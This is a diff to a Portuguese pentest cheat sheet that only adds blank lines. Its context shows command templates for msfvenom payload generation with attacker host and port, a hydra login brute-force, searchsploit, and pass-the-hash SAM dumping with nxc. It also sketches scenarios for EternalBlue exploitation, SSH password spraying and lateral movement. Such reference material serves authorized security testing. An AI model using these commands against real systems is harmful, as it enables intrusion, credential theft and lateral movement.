@@ -43,6 +43,7 @@ msfvenom -p [payload] LHOST=[IP_atacante] LPORT=[porta] -f [formato_saida] -o [a
 ```
 
 **Exemplo Prático de Aplicação:**
+
 - **Cenário:** Durante um *Internal Pentest*, o Nmap identificou que um servidor Windows Server 2008 legado (10.0.5.22) expõe a porta 445 com a assinatura vulnerável ao MS17-010 (EternalBlue). O objetivo é obter execução remota de código e estabelecer uma sessão interativa persistente para iniciar a fase de pós-exploração.
 - **Comandos Executados:**
 
@@ -83,6 +84,7 @@ searchsploit -m [caminho_do_exploit]
 ```
 
 **Exemplo Prático de Aplicação:**
+
 - **Cenário:** Após uma varredura com Nmap revelar que um servidor expõe o *ProFTPD* na versão 1.3.5, o analista precisa verificar rapidamente, sem depender de acesso à internet (rede isolada do cliente), se existe um *exploit* público documentado para essa versão específica antes de tentar o desenvolvimento manual de um vetor de ataque.
 - **Comandos Executados:**
 
@@ -117,6 +119,7 @@ hydra -l [usuario] -P [wordlist_senhas.txt] [alvo.com] http-post-form "/login:us
 ```
 
 **Exemplo Prático de Aplicação:**
+
 - **Cenário:** Durante um *Internal Pentest*, o analista identifica um servidor com o serviço SSH exposto (10.0.5.30) e, através de OSINT prévio, obteve uma lista de nomes de usuários corporativos plausíveis. O objetivo é validar se algum desses usuários utiliza senhas fracas presentes em uma *wordlist* de senhas vazadas conhecidas (rockyou.txt), respeitando um limite de paralelismo para não disparar o bloqueio de conta configurado no *Active Directory*.
 - **Comando Executado:**
 
@@ -153,6 +156,7 @@ nxc smb [IP_do_alvo] -u [usuario] -H [hash_ntlm] --sam
 ```
 
 **Exemplo Prático de Aplicação:**
+
 - **Cenário:** Após a obtenção de uma credencial de usuário de domínio de baixo privilégio através de um ataque de *phishing*, o analista precisa verificar rapidamente em qual dos 200 servidores da rede corporativa (10.0.0.0/24) essa credencial concede privilégios administrativos locais, um passo essencial para identificar o próximo alvo de movimentação lateral.
 - **Comando Executado:**
 
